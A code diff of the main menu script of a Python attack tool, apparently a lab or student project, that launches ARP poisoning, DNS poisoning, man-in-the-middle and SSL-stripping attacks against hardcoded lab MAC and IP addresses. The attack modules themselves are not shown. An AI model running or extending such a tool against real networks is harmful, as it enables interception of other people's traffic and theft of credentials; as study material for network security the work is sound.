@@ -1,13 +1,17 @@
-from arpPoison import *
+# import sys
+import threading
+
 from dnsPoison import *
-from sslStrip import *
+from arpPoison import *
+from sslStripping import *
+from sslPlagiarism import *
 from setup import *
 
-hwA,hwV,ipV,ipG = "attacker MAC","victim MAC","victim IP","gateway IP"
+hwA,hwV,hwG,ipV,ipG = "attacker MAC","victim MAC","gateway MAC","victim IP","gateway IP"
 
 urlsToSpoof = {} 
-addrs = {hwA:"00:00:00:00:00:00",hwV:"00:00:00:00:00:00",ipV:"0.0.0.0",ipG:"0.0.0.0"}
-interface = "enp0s3"
+a = {hwA:"08:00:27:53:b4:c8",hwV:"08:00:27:fe:5c:2e",hwG:"52:54:00:12:35:00",ipV:"10.0.2.5",ipG:"10.0.2.1"}
+interface = "enp0s9"
 
 print("")
 print("Welcome to the tool, this tool is a console style tool.")
@@ -15,13 +19,18 @@ print("For the list of commands use the command 'help'")
 print("For more info on a command use the command 'help [command]'")
 print("to close or reset the tool, use the input 'ctrl+c'")
 
-showAddrs(addrs)
+showAddrs(a)
 showUrlsToSpoof(urlsToSpoof)
 interface = getInterface(interface)
 
 runner = True
 
 while runner:
+ 
+    mimThread = threading.Thread(target=mimAttack, name="mimattack", args=(a,interface))
+    owpThread = threading.Thread(target=oneWayPoisoning, name="owpoisoning", args=(a,interface))
+    sslThread = threading.Thread(target=sslStripping, name="sslstripping")
+
     user_in = raw_input("\n>>> ")
         
     if(user_in == "help"):
@@ -35,10 +44,10 @@ while runner:
         print("it can also be used in the format 'help [command]' to get more info on the specified command.")
         
     elif(user_in == "mimattack"):
-        mimAttack(interface)
+        mimThread.start()
         
     elif(user_in == "onewaypoisoning"):
-        oneWayPoisoning(interface)
+        owpThread.start()
 
     elif(user_in == "showurls"):
         showUrlsToSpoof(urlsToSpoof)
@@ -49,9 +58,23 @@ while runner:
     elif(user_in == "reseturls"):
         urlsToSpoof = {}
 
+    elif(user_in == "showaddrs"):
+        showAddrs(a)
+
+    elif(user_in == "setaddrs"):
+        addAddrs(a)
+
     elif(user_in == "dnspoisoning"):
-        dnsPoisoning(urlsToSpoof)
+        dnsPoisoning(interface,a,urlsToSpoof)
         
+    elif(user_in == "sslstripping"):
+        # sslThread.start()
+        owpThread.start()
+        sslStripping()
+
+    elif(user_in == "stopssl"):
+        stopStripping()
+
     else:
         print("Command not found")
         print("For the list of commands use the command 'help'")
